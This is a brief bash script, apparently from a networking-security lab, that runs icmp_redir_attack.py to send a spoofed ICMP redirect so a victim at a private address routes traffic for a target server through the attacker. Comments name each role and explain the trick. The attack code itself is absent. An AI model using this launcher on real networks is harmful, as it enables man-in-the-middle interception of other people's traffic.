#!/bin/bash
#victim:  client   192.168.1.11
#target:  server   192.168.2.22
#gateway: attacker 192.168.1.12
#source:  router   192.168.1.1
#message will contain gateway router ip as src and attacker's ip as new gateway
#tricking Victim into thinking that gateway router sent the icmp redirect message
#to redirect it's messages to the attacker which are destined to the target destination 
python icmp_redir_attack.py -v 192.168.1.11 -t 192.168.2.22 -g 192.168.1.12 -s 192.168.1.1